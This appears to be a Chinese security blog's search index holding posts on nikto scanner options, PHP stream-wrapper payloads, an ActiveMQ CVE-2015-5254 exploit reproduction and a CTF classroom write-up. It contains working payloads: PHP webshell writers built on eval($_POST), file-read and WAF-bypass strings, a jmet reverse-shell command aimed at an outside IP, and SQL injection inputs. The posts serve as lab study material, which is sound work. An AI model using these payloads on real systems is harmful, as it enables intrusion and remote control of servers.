<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>nikto工具参数</title>
    <url>/2020/05/15/nikto/</url>
    <content><![CDATA[<h2 id="web扫描工具（nikto）"><a href="#web扫描工具（nikto）" class="headerlink" title="web扫描工具（nikto）"></a>web扫描工具（nikto）</h2><h3 id="一、web漏洞扫描原理"><a href="#一、web漏洞扫描原理" class="headerlink" title="一、web漏洞扫描原理"></a>一、web漏洞扫描原理</h3><ol>
<li>web漏洞扫描是在web信息搜集的基础上，进行更进一步的安全评估、漏洞挖掘、渗透测试。</li>
<li>web漏洞扫描能够让我们进一步挖掘sql注入、xss跨站脚本攻击、csrf跨站请求伪造等漏洞。</li>
<li>web漏洞扫描虽然能够帮助我们快速的实现自动化扫描，但并不是全能的，也会出现误报，需要手工结合。</li>
<li>未授权对目标服务器/应用进行渗透测试，本质上就是一种攻击行为，若对业务造成影响，可能会有法律责任。</li>
</ol>
<h3 id="二、nikto的功能与用途"><a href="#二、nikto的功能与用途" class="headerlink" title="二、nikto的功能与用途"></a>二、nikto的功能与用途</h3><h4 id="1、nikto简介"><a href="#1、nikto简介" class="headerlink" title="1、nikto简介"></a>1、nikto简介</h4><ol>
<li>Nikto是一款开源的（GPL）网页服务器扫描器，它可以对网页服务器进行全面的多种扫描，包含超过3300种有潜在危险的文件/CGIs；超过625种服务器版本；超过230种特定服务器。它可以扫描指定主机的WEB类型、主机名、特定目录、COOKIE、特定CGI漏洞、返回主机允许的http模式等等。扫描项和插件可以自动更新（如果需要）。基于Whisker/libwhisker完成其底层功能。这是一款非常棒的工具，Nikto是网管安全人员必备的WEB审计工具之一。</li>
<li>Nikto是基于PERL开发的程序，所以需要PERL环境。Nikto支持Windows（使用ActiveState Perl环境）、Mac OSX、多种Linux 或Unix系统。Nikto使用SSL需要Net::SSLeay PERL模式，则必须在Unix平台上安装OpenSSL。</li>
</ol>
<h4 id="2、功能"><a href="#2、功能" class="headerlink" title="2、功能"></a>2、功能</h4><ol>
<li>Nikto 爬取目标站点并生成大量预先准备的请求，尝试识别应用中存在的危险脚本和文件。</li>
<li>Nikto是一个用来发现默认网页文件、检查网页服务器和CGI安全问题的工具。它对远程主机使用大量请求，这些过量的请求可能会导致远程主机宕机。Nikto可能会损害主机、远程主机和网络。某些选项可能对目标产生超过 70,000个HTTP请求。 同样从网站更新的插件也不能保证绝对系统无害，选择权在用户手中。</li>
</ol>
<h4 id="3、用途"><a href="#3、用途" class="headerlink" title="3、用途"></a>3、用途</h4><ol>
<li>Nikto 是 Kali 中的命令行工具，用于评估 Web 应用的已知安全问题。</li>
<li>Nikto工具可以帮助我们对Web的安全进行审计，及时发现网站存在的安全漏洞，对网站的安全做进一步的扫描评估。</li>
</ol>
<h3 id="三、nikto使用方法与参数"><a href="#三、nikto使用方法与参数" class="headerlink" title="三、nikto使用方法与参数"></a>三、nikto使用方法与参数</h3><h4 id="1、nikto-h-目标主机-参数-（-h是必不可少参数，没有-h其他参数不会有对应的扫描结果）"><a href="#1、nikto-h-目标主机-参数-（-h是必不可少参数，没有-h其他参数不会有对应的扫描结果）" class="headerlink" title="1、nikto -h 目标主机  +参数  （-h是必不可少参数，没有-h其他参数不会有对应的扫描结果）"></a>1、nikto -h 目标主机  +参数  （-h是必不可少参数，没有-h其他参数不会有对应的扫描结果）</h4><h4 id="2、nikto的参数"><a href="#2、nikto的参数" class="headerlink" title="2、nikto的参数"></a>2、nikto的参数</h4><ol>
<li>-H     查看帮助</li>
<li>-host &lt;目标主机&gt;    等同于-h</li>
<li>-list-plugin    显示可用插件</li>
<li>-port  &lt;端口号&gt;    指定端口</li>
<li>-ssl     目标采用https连接时，加上这个参数</li>
<li>-useproxy <a href="http://127.0.0.1:9999" target="_blank" rel="noopener">http://127.0.0.1:9999</a>     防止被Ban，使用匿名代理服务器</li>
<li>-evasion &lt;数字&gt;      防止被IDS检测异常请求（选项有多种混淆方式，输入数字选择）</li>
<li>-C     扫描CGI目录</li>
<li>-D &lt;数字&gt;    控制输出（打开或关闭默认输出）<ol>
<li>1 显示重定向</li>
<li>2 显示获取的cookies信息</li>
<li>3 显示所有200/OK的回应</li>
<li>4 显示请求认证的URLs</li>
<li>D Debug输出</li>
<li>V 冗余输出</li>
</ol>
</li>
<li>-V     显示插件和数据库的版本信息</li>
<li>-dbcheck     检查数据库和其他重要文件的句法错误</li>
<li>-e &lt;数字&gt;    使用LibWhisker中对IDS的躲避技术<ol>
<li>1 随机URL编码（非UTF-8方式）</li>
<li>2 自选择路径（/./）</li>
<li>3 过早结束的URL</li>
<li>4 优先考虑长随机字符串</li>
<li>5 参数欺骗</li>
<li>6 使用TAB作为命令的分隔符</li>
<li>7 使用变化的URL</li>
<li>8 使用Windows路径分隔符“\”</li>
</ol>
</li>
<li>-f     只寻找HTTP或HTTPS端口，不进行完全扫描</li>
<li>-i  &lt;id：密码&gt;   主机鉴定</li>
<li>-m &lt;数字&gt;    猜解更多的文件名<ol>
<li>1 检测根目录下的所有文件</li>
<li>2 猜测密码文件名</li>
<li>3 通过Apache（/~User请求类型）枚举用户名</li>
<li>4 通过cgiwrap（/cgi-bin/cgiwrap/~User请求类型）枚举用户名</li>
</ol>
</li>
<li>-T &lt;参数&gt;     控制Nikto使用不同的方式对目标进行扫描<ol>
<li>0 文件上传<br>1 日志方式<br> 　　2 默认文件<br> 　　3 信息泄露<br> 　　4 注入（XSS/Script/HTML）<br> 　　5 远程文件检索（Web目录中）<br> 　　6 拒绝服务<br> 　　7 远程文件检索（服务器）<br> 　　8 代码执行—远程shell<br> 　　9 SQL注入<br> 　　a 认证绕过<br> 　　b 软件关联<br> 　　c 远程资源包含<br> 　　x 反向连接选项</li>
</ol>
</li>
<li>-u     使用在nikto.conf中定义的代理</li>
<li>-o     输出到指定文件</li>
<li>-F     指定检测报告输出文件的格式，默认是txt文件格式（可以是htm、csv、txt或xml格式）</li>
</ol>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>php伪协议</title>
    <url>/2020/05/15/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><h2 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h2><h3 id="文件读取相关函数"><a href="#文件读取相关函数" class="headerlink" title="文件读取相关函数"></a>文件读取相关函数</h3><ul>
<li>include</li>
<li>require</li>
<li>include_once</li>
<li>require_once</li>
<li>highlight_file</li>
<li>show_source</li>
<li>readfile</li>
<li>file_get_contents</li>
<li>fopen</li>
<li>file</li>
</ul>
<h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file://协议"></a>file://协议</h3><ul>
<li>allow_url_fopen:off/on</li>
<li>allow_url_include:off/on </li>
<li>双off状态也能使用，用于读取本地文件</li>
<li>语法：file://C:/flag.txt</li>
<li>file=php://input post写入：<?php system('cat flag.txt');?></li>
</ul>
<h3 id="php-协议"><a href="#php-协议" class="headerlink" title="php://协议"></a>php://协议</h3><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><ul>
<li>用于读取源码并进行base64编码输出</li>
<li>php.ini 在双off情况下也能正常使用</li>
<li>语法：php://filter/read=convert.base64-encode/resource=./flag.php</li>
</ul>
<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><ul>
<li>访问请求原始数据只读流，将post请求的数据作为PHP执行。</li>
<li>php.ini allow_url_include:on 需要为on状态才可以执行</li>
<li>语法:php://input –POST输入<?php fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd]); ?>‘); ?&gt;</li>
<li>或者<?php $lines=file('flag');foreach($lines as $line_num => $line){ echo "Line #{$line_num} : ",$line,'
';} ?></li>
<li>&lt;?php</li>
</ul>
<p>$file = fopen(“a1.php”,”w”); echo fputs($file,”<?php @eval($_POST[alin]); ?>“); fclose($file); ?&gt;</p>
<h4 id="zip-、bzip-、zlib"><a href="#zip-、bzip-、zlib" class="headerlink" title="zip://、bzip://、zlib://"></a>zip://、bzip://、zlib://</h4><ul>
<li>php.ini 在双off下也可以使用</li>
<li>属于压缩流，可以访问压缩文件中的自文件，不需要指定后缀名。</li>
</ul>
<h5 id="zip-压缩文件绝对路径-压缩文件内的子文件名"><a href="#zip-压缩文件绝对路径-压缩文件内的子文件名" class="headerlink" title="zip://[压缩文件绝对路径]#[压缩文件内的子文件名]"></a>zip://[压缩文件绝对路径]#[压缩文件内的子文件名]</h5><ul>
<li>zip://D:/soft/phpstudy/www/file.jpg%23phpcode.txt</li>
<li>先将要执行的PHP代码写好文件名为phpcode.txt，将phpcode.txt进行zip压缩,压缩文件名为file.zip,如果可以上传zip文件便直接上传，若不能便将file.zip重命名为file.jpg后在上传，其他几种压缩格式也可以这样操作。</li>
</ul>
<h5 id="compress-bzip2-file-bz2"><a href="#compress-bzip2-file-bz2" class="headerlink" title="compress.bzip2://file.bz2"></a>compress.bzip2://file.bz2</h5><ul>
<li>compress.bzip2://D:/soft/phpstudy/www/file.jpg or compress.bzip2://./file.jpg</li>
</ul>
<h5 id="compress-zlib-file-gz"><a href="#compress-zlib-file-gz" class="headerlink" title="compress.zlib://file.gz"></a>compress.zlib://file.gz</h5><ul>
<li>compress.zlib://D:/soft/phpStudy/WWW/file.jpg or compress.zlib://./file.jpg</li>
</ul>
<h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data://协议"></a>data://协议</h3><ul>
<li>php.ini 必须双on才能使用</li>
<li>语法：data://text/plain,<?php phpinfo()?><br>data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=<br>data:text/plain,<?php phpinfo()?><br>data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</li>
<li>data://text/plain;cgarset=utf-8,<?php system('cat flag.txt');?></li>
</ul>
<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><h5 id="stub基本结构"><a href="#stub基本结构" class="headerlink" title="stub基本结构"></a>stub基本结构</h5><ul>
<li>&lt;?php HALT_COMPILER();, stub必须以HALT_COMPILER();来作为结束部分，否则Phar拓展将不会识别该文件。</li>
<li>php.ini文件中phar.readonly=Off,不然无法生成phar文件。</li>
</ul>
<h4 id="利用zip或phar伪协议读取压缩包中的文件"><a href="#利用zip或phar伪协议读取压缩包中的文件" class="headerlink" title="利用zip或phar伪协议读取压缩包中的文件"></a>利用zip或phar伪协议读取压缩包中的文件</h4><ul>
<li>phar://./images/1499394959.jpg/1.php<br>zip://./images/1499394959.jpg%231.php<br>文件压缩后，改成jpg格式，文件名以md5加密访问，zip访问需要#</li>
<li></li>
</ul>
<h3 id="绕过waf方法"><a href="#绕过waf方法" class="headerlink" title="绕过waf方法"></a>绕过waf方法</h3><ul>
<li>?f=php://filter/convert.base64-encode/resource=login.php（过滤了操作名read）</li>
<li>?f=php://filter/read=convert.base64-encode/resource=1.jpg/resource=./show.php（正则 /resource=*.jpg/i）</li>
<li>?f=data:text/plain,<?php phpinfo()?></li>
<li>?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</li>
<li>%00截断 /etc/passwd%00</li>
<li>路径长度截断： /etc/passwd/././././././.[…]/./././././.</li>
<li>点号截断： /boot.ini/………[…]…………</li>
</ul>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
  </entry>
  <entry>
    <title>ActiveMQ反序列化漏洞（CVE-2015-5254）复现</title>
    <url>/2020/05/16/vulhub-1/</url>
    <content><![CDATA[<h1 id="ActiveMQ-反序列化漏洞（CVE-2015-5254）"><a href="#ActiveMQ-反序列化漏洞（CVE-2015-5254）" class="headerlink" title="ActiveMQ 反序列化漏洞（CVE-2015-5254）"></a>ActiveMQ 反序列化漏洞（CVE-2015-5254）</h1><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</p>
<p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf</a></li>
</ul>
<h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>运行漏洞环境：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure>

<p>值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geu8yssn1lj31pm0nggos.jpg" alt="img"></p>
<p>将命令替换成弹shell语句再利用：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geu8yurmr8j30qo06gjrx.jpg" alt="img"></p>
<p>点击查看这条消息即可触发命令执行，此时进入容器<code>docker-compose exec activemq bash</code>，可见/tmp/success已成功创建，说明漏洞利用成功：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geu8yr5ezhj30tz0ajwf1.jpg" alt="img"></p>
<p>此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过<code>http://your-ip:8161/admin/browse.jsp?JMSDestination=event</code>看到这个队列中所有消息：</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1geu8yttuoej30ys0cedh2.jpg" alt="img"></p>
<p>执行：</p>
<p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p>
<p>使用<a href="https://github.com/matthiaskaiser/jmet" target="_blank" rel="noopener">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p>
<ol>
<li>构造（可以使用ysoserial）可执行命令的序列化对象</li>
<li>作为一个消息，发送给目标61616端口</li>
<li>访问web管理页面，读取消息，触发漏洞</li>
</ol>
<p>漏洞利用过程如下：</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
<li>下载jmet进行漏洞利用:</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;matthiaskaiser&#x2F;jmet&#x2F;releases&#x2F;download&#x2F;0.1.0&#x2F;jmet-0.1.0-all.jar</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><p>执行命令</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar jmet-<span class="number">0.1</span><span class="number">.0</span>-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"touch /tmp/sucess"</span> -Yp ROME   <span class="number">45.32</span><span class="number">.101</span><span class="number">.90</span>   <span class="number">61616</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>此时会给目标的ActiveMQ添加一个名为事件的队列，可以我们通过<a href="http://45.32.101.90:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息：" target="_blank" rel="noopener">http://45.32.101.90:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息：</a></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gewvc9ygy3j30j809emxg.jpg" alt="img"></p>
<p>然后点击消息触发，命令执行</p>
</li>
<li><p>然后进入docker容器，看一看到success文件已创建</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gewvc9ibj4j30j806cglz.jpg" alt="img"></p>
</li>
<li><p>反弹shell</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -jar jmet-<span class="number">0.1</span><span class="number">.0</span>-all.jar -Q event -I ActiveMQ -s -Y <span class="string">"bash -i &gt;&amp; /dev/tcp/45.32.101.90/12340&gt;&amp;1"</span> -Yp ROME45<span class="number">.32</span><span class="number">.101</span><span class="number">.90</span>   <span class="number">61616</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc  -lvvp 1234</span><br></pre></td></tr></table></figure>

<p>看到返回的是shell</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gewvcf3nhmj30j8036jrf.jpg" alt="img"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>vulhub漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>记录第二次课堂ctf入门练习</title>
    <url>/2020/05/15/%E7%BB%83%E4%B9%A02/</url>
    <content><![CDATA[<h3 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h3><p>打开页面发现<a href="http://10.196.8.21:18083/calculate/" target="_blank" rel="noopener">http://10.196.8.21:18083/calculate/</a></p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dbqvlb4j30qc0ak769.jpg" alt="image-20191220163633946"></p>
<p>利用python的requests库做计算，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://10.196.8.21:18083/calculate/'</span></span><br><span class="line"></span><br><span class="line">res = requests.session()</span><br><span class="line"></span><br><span class="line">ans1 = res.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print ans1.content</span></span><br><span class="line"></span><br><span class="line">calc = re.findall(<span class="string">r"&gt;(.*?)&lt;/div&gt;"</span>,ans1.content)</span><br><span class="line"></span><br><span class="line">s = <span class="string">""</span>.join(calc).strip(<span class="string">'='</span>)</span><br><span class="line"></span><br><span class="line">ans = eval(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">				<span class="keyword">print</span> <span class="string">'[+]Attacked by 0verWatch'</span></span><br><span class="line">				time.sleep(<span class="number">1</span>)</span><br><span class="line">				ans2 = res.post(*url*=url,*data*=&#123;<span class="string">"ans"</span>:ans&#125;).content</span><br><span class="line">				calc = re.findall(<span class="string">r"&gt;(.*?)&lt;/div&gt;"</span>,ans2)</span><br><span class="line">				s = <span class="string">""</span>.join(calc).strip(<span class="string">'='</span>)</span><br><span class="line">				ans = eval(s)</span><br><span class="line">				<span class="keyword">except</span>:</span><br><span class="line">								<span class="keyword">print</span> ans2</span><br><span class="line">				<span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dc450n2j30io0b5tgb.jpg" alt="image-20191220163734363"></p>
<p>Susctf{gr3At_cAcu1a7or}</p>
<h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><p>打开页面<a href="http://10.196.8.21:18083/faster/1ndex.php" target="_blank" rel="noopener">http://10.196.8.21:18083/faster/1ndex.php</a></p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dc8m4wbj30hh04sgm1.jpg" alt="image-20191220164548867"></p>
<p>发现有一个index.php页面，bp抓包回显flag{U3VzY3Rme2Zhc3Rlcl9hc195b3VfY2FufQ}</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dccdfy7j30uo0az40f.jpg" alt="image-20191220164638334"></p>
<h3 id="第4题"><a href="#第4题" class="headerlink" title="第4题"></a>第4题</h3><p>打开页面<a href="http://10.196.8.21:18083/iz/index.php，是代码审计" target="_blank" rel="noopener">http://10.196.8.21:18083/iz/index.php，是代码审计</a></p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dcfuymzj30jo0kyjui.jpg" alt="image-20191221092830810"></p>
<p>三个preg_match过滤参数，请求参数不能出现<code>_</code>，<code>0</code>和字符[A-Za-z0-9]</p>
<p>然后get请求<code>_</code>参数来传递，判断<code>_</code>参数如果是0，或者随机数字，输出标志</p>
<p>构造：<a href="http://10.196.8.21:18083/iz/index.php?.=%22进行绕过" target="_blank" rel="noopener">http://10.196.8.21:18083/iz/index.php?.=%22进行绕过</a></p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dcm3e2yj30h503kjs3.jpg" alt="image-20191221092958062"></p>
<p>flag{e18a4e931495e8fc961acad1da3d670b39bb5b22}</p>
<h3 id="第5题"><a href="#第5题" class="headerlink" title="第5题"></a>第5题</h3><p>打开页面<a href="http://10.196.8.21:18083/lfi/attachments/?file=flag" target="_blank" rel="noopener">http://10.196.8.21:18083/lfi/attachments/?file=flag</a></p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dcpjzexj30jr06bgma.jpg" alt="image-20191220104450242"></p>
<p>是个假的flag，尝试修改flag文件，发现源文件位flag.php，</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dcsrsirj30k3086jru.jpg" alt="image-20191220104734541"></p>
<p>flag隐藏在页面中，用php://filter/read=convert.base64-encode/resource=flag</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dcy4j5kj30uu039jsd.jpg" alt="image-20191220104835635"></p>
<p>base64解密，发现还有一层加密，</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dd00lbxj30tv0bmmzv.jpg" alt="image-20191220105059422"></p>
<p>再次bese64解密</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dd6cf9qj30g70400t1.jpg" alt="image-20191220105205641"></p>
<p>nuaactf{trying_2_use_LFI_yeah_!}</p>
<h3 id="第7题"><a href="#第7题" class="headerlink" title="第7题"></a>第7题</h3><p>打开<a href="http://10.196.8.21:18083/put/页面回显，" target="_blank" rel="noopener">http://10.196.8.21:18083/put/页面回显，</a></p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4ddcjqmdj30in04egm0.jpg" alt="image-20191220095811661"></p>
<p>put me a message then you can get the flag，</p>
<p>联想到用firefox的F12功能编辑和发送；利用PUT给<a href="http://10.196.8.21:18083/put/发送一条message，然后在响应栏中看到回显base64加密" target="_blank" rel="noopener">http://10.196.8.21:18083/put/发送一条message，然后在响应栏中看到回显base64加密</a></p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4ddge481j313f08mgo4.jpg" alt="image-20191220095845492"></p>
<p>利用python解密得flag{cmVxdWVzdF9pbl9wdXRfbWV0aG9k}</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4ddlfn5uj30ee022glt.jpg" alt="image-20191220095853548"></p>
<h3 id="第8题"><a href="#第8题" class="headerlink" title="第8题"></a>第8题</h3><p>打开<a href="http://10.196.8.21:18083/sign-in/attachments/说明了是签到题" target="_blank" rel="noopener">http://10.196.8.21:18083/sign-in/attachments/说明了是签到题</a></p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4ddpsr2pj30re0d6jtz.jpg" alt="image-20191220100044554"></p>
<p>然后查看源码，发现nuaactf{buddha_b1ess_us_n0_bug_233}</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4ddtqxqgj30gv0b775b.jpg" alt="image-20191220100118357"></p>
<h3 id="第9题"><a href="#第9题" class="headerlink" title="第9题"></a>第9题</h3><p>打开页面<a href="http://10.196.8.21:18083/sqli_twice/attachments/" target="_blank" rel="noopener">http://10.196.8.21:18083/sqli_twice/attachments/</a></p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4ddzjx8bj30or0dtdhb.jpg" alt="image-20191220102722250"></p>
<p>默认应该是index.php,尝试有没有备份文件呢，加上.bar看下，发现存在备份文件</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4de3atqaj30hn07it9t.jpg" alt="image-20191220102859363"></p>
<p>下载文件，查看源码，查找flag关键语句</p>
<p>显然 <strong>$_SESSION[‘user’]</strong> 是注入点，并且可以通过注册任意用户名来控制，然后就可以为所欲为了。</p>
<p>由于过滤不严格，只要使查询语句返回1就可以爆出flag，</p>
<p>me’ and 1=0 union select 1#</p>
<p>nuaactf{do_!<em>B</em>anxious_MY_friend.}</p>
<h3 id="第11题"><a href="#第11题" class="headerlink" title="第11题"></a>第11题</h3><p>打开页面发现源码</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4des00dtj30k40csjsz.jpg" alt="image-20191220150622555"></p>
<p>发现，存在正则过滤，用%00截断password[]=a%00</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dexya62j30m1059gmg.jpg" alt="image-20191220150900795"></p>
<p>flag{3a9f3478bc9a9ec348ea30534618d4592ad5a519}</p>
<h3 id="第12题"><a href="#第12题" class="headerlink" title="第12题"></a>第12题</h3><p>打开<a href="http://10.196.8.21:18003/5c55674b83536ad3/index.php，回显密码为假" target="_blank" rel="noopener">http://10.196.8.21:18003/5c55674b83536ad3/index.php，回显密码为假</a></p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dffo1hlj30kf04qjry.jpg" alt="image-20191220100355322"></p>
<p>应该是把输入的值与后台的值做比较，如果可以，输出标记。</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dfg0502j30m804u3za.jpg" alt="image-20191220101047369"></p>
<p>构造语句password []=0,回显flag{5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8}</p>
<h3 id="第13题"><a href="#第13题" class="headerlink" title="第13题"></a>第13题</h3><p>打开页面<a href="http://10.196.8.21:18003/c569d1f25f24fc39/index.php" target="_blank" rel="noopener">http://10.196.8.21:18003/c569d1f25f24fc39/index.php</a></p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dfjeto0j30j505vmxt.jpg" alt="image-20191220151244561"></p>
<p>当有2个is_numeric的时候，and后面的可以绕过,构造a=123456&amp;b=asdads</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dfm43u2j30m5058dgl.jpg" alt="image-20191220151421550"></p>
<p>flag{9d42150fe917c3f9195e7fca2bb380baf00b0880}</p>
<h3 id="第14题"><a href="#第14题" class="headerlink" title="第14题"></a>第14题</h3><p>打开页面<a href="http://10.196.8.21:18003/9630e9ba0442fa3a/index.php" target="_blank" rel="noopener">http://10.196.8.21:18003/9630e9ba0442fa3a/index.php</a></p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dfpupa2j30km05qq3i.jpg" alt="image-20191220101514679"></p>
<p>回显了一个先登录，去看下源码发现</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dfrofnzj30iz06awey.jpg" alt="image-20191220101624082"></p>
<p>获得flag要求的条件是：username != password &amp; sha1(username) == sha1(password)，可以利用sha1()函数的漏洞来绕过。</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dfwyxr1j30og04zwfb.jpg" alt="image-20191220102244136"></p>
<p>?username[]=1&amp;password[]=9</p>
<p>flag{34891b0ddacecf35abf9983a79a3a83bc59296a5}</p>
<h3 id="第15题"><a href="#第15题" class="headerlink" title="第15题"></a>第15题</h3><p>打开页面<a href="http://10.196.8.21:18003/abf20c91a442da48/index.html" target="_blank" rel="noopener">http://10.196.8.21:18003/abf20c91a442da48/index.html</a></p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dg0rkruj30mh05hwfa.jpg" alt="image-20191220152154642"></p>
<p>提示用本地包含，没看到传参，去index.php看看，发现page</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dg3uth4j30ic04s74s.jpg" alt="image-20191220152300412"></p>
<p>用本地文件包含php://filter读取文件，php://filter/read=convert.base64-encode/resource=./Y29uZmln.php</p>
<p>解密得：</p>
<?php 
phpinfo(); 
/*flag{bcc9b4b4eb59dcb24e1ecb5c4165e096e5606ea2}*/
?>

<h3 id="第16题"><a href="#第16题" class="headerlink" title="第16题"></a>第16题</h3><p>打开页面<a href="http://10.196.8.21:18003/c9bf52aa72e0299b/index.php" target="_blank" rel="noopener">http://10.196.8.21:18003/c9bf52aa72e0299b/index.php</a></p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dg76rayj30ie05dq3h.jpg" alt="image-20191220152707453"></p>
<p>发现类似base64解密看看，发现flag{ThiS_a@   ,是flag一部分</p>
<p>目录扫描发现还有一个index.php.txt</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1ga4dgahnc4j30ko09j3zf.jpg" alt="image-20191220152840732"></p>
<p>传参为a,get方式，传入一个值，回显缺失的值，ZmxhZyU3QlRoaVNfYV9WdWxOQ3RGX2ZsYWclN0Q=</p>
<p>解密得flag{ThiS_a_VulNCtF_flag}</p>
<h3 id="第21题"><a href="#第21题" class="headerlink" title="第21题"></a>第21题</h3><p>下载文件用IDA打开，发现需要找到程序的破解密码，</p>
